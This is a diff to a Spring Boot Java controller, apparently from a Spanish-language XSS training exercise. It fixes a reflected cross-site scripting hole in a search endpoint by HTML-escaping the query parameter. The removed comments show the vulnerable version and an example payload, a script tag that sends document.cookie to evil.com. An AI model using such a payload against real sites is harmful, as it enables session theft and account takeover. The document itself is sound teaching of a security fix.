@@ -9,24 +9,16 @@ import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.ResponseBody;
 import org.springframework.web.bind.annotation.RestController;
 
+import org.springframework.web.util.HtmlUtils;
+
 @RestController
 @RequestMapping("/api/xss")
 public class SearchController {
 
-    // VULNERABLE (punto de inicio del ejercicio):
-    // @GetMapping("/search")
-    // @ResponseBody
-    // public String search(@RequestParam String q) {
-    //     return "<html><body><h2>Resultados para: " + q + "</h2></body></html>";
-    // }
-    //
-    // Un atacante puede enviar: q=<script>document.location='https://evil.com?c='+document.cookie</script>
-    // El navegador de la victima ejecuta el script porque el HTML se devuelve sin escapar.
-    // El atacante roba las cookies de sesion y toma control de la cuenta.
-
     @GetMapping("/search")
     @ResponseBody
     public String search(@RequestParam String q) {
-        return "<html><body><h2>Resultados para: " + q + "</h2></body></html>";
+        String safeQ = HtmlUtils.htmlEscape(q);
+        return "<html><body><h2>Resultados para: " + safeQ + "</h2></body></html>";
     }
 }
